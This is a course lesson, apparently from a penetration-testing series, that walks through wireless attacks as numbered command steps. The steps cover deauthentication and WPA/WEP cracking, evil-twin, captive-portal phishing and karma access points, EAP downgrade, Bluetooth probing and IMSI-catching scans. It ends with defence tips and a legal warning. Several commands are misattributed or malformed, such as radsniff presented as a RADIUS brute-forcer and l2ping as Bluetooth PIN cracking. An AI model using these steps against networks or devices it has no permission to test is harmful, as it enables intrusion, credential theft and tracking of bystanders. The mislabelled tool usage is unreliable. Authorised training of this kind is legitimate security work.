# LESSON 7: Wireless & Bluetooth Security

## Objective
Master wireless network attacks including WiFi cracking, rogue access points, Bluetooth exploitation, and radio frequency analysis. Learn to compromise wireless infrastructure and mobile devices.

## Prerequisites
- Lessons 1-6 completed
- Wireless network adapter capable of monitor mode
- Understanding of 802.11 protocols
- Basic knowledge of radio frequencies

## Phase 1: WiFi Network Discovery

### Step 1: Wireless Interface Setup
```bash
# Check wireless interfaces
iwconfig
iw dev

# Enable monitor mode
airmon-ng check kill
airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon
```

### Step 2: Network Reconnaissance
```bash
# Scan for wireless networks
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Save scan results
airodump-ng -w wireless_scan --output-format csv wlan0mon
```

### Step 3: Client Discovery
```bash
# Monitor specific network for clients
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Probe request monitoring
tshark -i wlan0mon -f "type mgt subtype probe-req"
```

## Phase 2: WPA/WPA2 Attacks

### Step 4: Handshake Capture
```bash
# Capture 4-way handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Deauthentication attack to force handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Verify handshake capture
aircrack-ng handshake-01.cap
```

### Step 5: WPA Password Cracking
```bash
# Dictionary attack on handshake
aircrack-ng -w rockyou.txt handshake-01.cap

# Convert for hashcat
cap2hccapx handshake-01.cap handshake.hccapx

# Hashcat GPU cracking
hashcat -m 2500 handshake.hccapx rockyou.txt

# Rule-based attack
hashcat -m 2500 handshake.hccapx rockyou.txt -r best64.rule
```

## Phase 3: WEP Attacks

### Step 6: WEP Cracking
```bash
# Monitor WEP network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# ARP request replay attack
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CLIENT_MAC wlan0mon

# Crack WEP key
aircrack-ng wep_capture-01.cap

# Alternative: Fragmentation attack
aireplay-ng -5 -b AA:BB:CC:DD:EE:FF wlan0mon
```

## Phase 4: Rogue Access Points

### Step 7: Evil Twin Attack
```bash
# Create rogue AP
hostapd hostapd.conf
# hostapd.conf:
# interface=wlan0
# driver=nl80211
# ssid=FreeWiFi
# channel=6
# hw_mode=g

# DHCP and internet sharing
dnsmasq -C dnsmasq.conf -d
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### Step 8: Captive Portal Attack
```bash
# Wifiphisher automated attack
wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade

# Manual captive portal
# Redirect all HTTP traffic to fake portal
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
```

### Step 9: Karma Attack
```bash
# Respond to all probe requests
hostapd-mana hostapd-mana.conf

# Capture credentials
tail -f /var/log/hostapd-mana.log
```

## Phase 5: Enterprise WiFi Attacks

### Step 10: WPA-Enterprise Attacks
```bash
# EAP method enumeration
eap_hammer.py --interface wlan0mon --bssid AA:BB:CC:DD:EE:FF

# EAP downgrade attack
hostapd-eaphammer --cert-wizard
eaphammer --bssid AA:BB:CC:DD:EE:FF --essid CorporateWiFi --channel 6
```

### Step 11: RADIUS Server Attacks
```bash
# RADIUS brute force
radsniff -i wlan0mon -W dictionary.txt

# PEAP credential extraction
eapmd5pass -w wordlist.txt -r capture.pcap
```

## Phase 6: Bluetooth Exploitation

### Step 12: Bluetooth Discovery
```bash
# Enable Bluetooth
hciconfig hci0 up
hciconfig hci0 piscan

# Scan for devices
hcitool scan
bluetoothctl scan on

# Device information
hcitool info AA:BB:CC:DD:EE:FF
sdptool browse AA:BB:CC:DD:EE:FF
```

### Step 13: Bluetooth Attacks
```bash
# BlueTooth PIN brute force
btscanner
l2ping -i hci0 -f AA:BB:CC:DD:EE:FF

# File transfer attacks
obexftp -b AA:BB:CC:DD:EE:FF -l

# Bluesniff for discoverable devices
bluesniff -i hci0

# BlueZ utilities
rfcomm connect 0 AA:BB:CC:DD:EE:FF 1
```

### Step 14: BLE (Bluetooth Low Energy) Attacks
```bash
# BLE scanning
hcitool lescan
gatttool -b AA:BB:CC:DD:EE:FF --interactive

# BLE service enumeration
bluetoothctl connect AA:BB:CC:DD:EE:FF
bluetoothctl gatt list-attributes

# BLE sniffing
btmon
```

## Phase 7: Software Defined Radio (SDR)

### Step 15: RF Analysis with RTL-SDR
```bash
# Scan frequency spectrum
rtl_power -f 88M:108M:100k -g 50 -i 2 fm_scan.csv

# Monitor specific frequency
rtl_fm -f 146.52M -M fm -s 22050 -g 50 | aplay -r 22050 -f S16_LE

# Decode digital signals
rtl_433 -f 433920000
```

### Step 16: GSM/Cellular Analysis
```bash
# GSM base station scanning
kalibrate-rtl -s GSM900

# IMSI catching (educational only)
grgsm_scanner -f 900e6:1000e6 -g 50

# Cell tower information
cellid_lookup.py --lac 12345 --cid 67890
```

## Custom Scripts Usage

### wifi_cracker.py
```bash
# Automated WiFi handshake capture and cracking
python3 scripts/lesson_07_wireless_security/wifi_cracker.py --interface wlan0mon --target "TargetNetwork"
```

### bluetooth_scanner.py
```bash
# Comprehensive Bluetooth device enumeration
python3 scripts/lesson_07_wireless_security/bluetooth_scanner.py --scan-time 30 --detailed
```

## Evidence Collection

### Step 17: Document Wireless Attacks
```bash
# Handshake verification
aircrack-ng -w /dev/null handshake-01.cap 2>&1 | grep "1 handshake"

# Network survey results
iwlist wlan0 scan | grep -E "(ESSID|Encryption|Quality)"

# Bluetooth device dump
hcitool scan > bluetooth_devices.txt
```

## Success Criteria

✓ Monitor mode enabled successfully
✓ WPA handshake captured and cracked
✓ WEP network compromised
✓ Rogue access point deployed
✓ Bluetooth devices enumerated
✓ BLE services analyzed
✓ RF spectrum analyzed
✓ Custom scripts functioning

## Wireless Security Tools Reference

| Tool | Purpose | Protocol |
|------|---------|----------|
| airodump-ng | Network discovery | 802.11 |
| aireplay-ng | Packet injection | 802.11 |
| aircrack-ng | WPA/WEP cracking | 802.11 |
| hostapd | Access point creation | 802.11 |
| hcitool | Bluetooth scanning | Bluetooth |
| gatttool | BLE interaction | Bluetooth LE |
| rtl_433 | RF signal decoding | Various |

## Attack Vectors Summary

### WiFi Attacks
- **WEP**: Statistical attack on weak IV
- **WPA/WPA2**: Dictionary attack on 4-way handshake
- **WPS**: PIN brute force vulnerability
- **Enterprise**: EAP method downgrade attacks

### Bluetooth Attacks
- **Bluejacking**: Unsolicited message sending
- **Bluesnarfing**: Unauthorized data access
- **Bluebugging**: Device control exploitation

## Defense Recommendations

- Use WPA3 with strong passwords
- Disable WPS
- Monitor for rogue access points
- Implement 802.1X authentication
- Regular security audits
- Disable unnecessary Bluetooth services
- Use MAC address filtering (with awareness of limitations)
- Monitor RF spectrum for anomalies

## Legal Considerations

⚠️ **WARNING**: Wireless attacks must only be performed on networks you own or have explicit permission to test. Unauthorized access to wireless networks is illegal in most jurisdictions.

## Next Lesson Preview
**Lesson 8**: Mobile Device Attacks
- Android APK analysis
- iOS application security
- Mobile device exploitation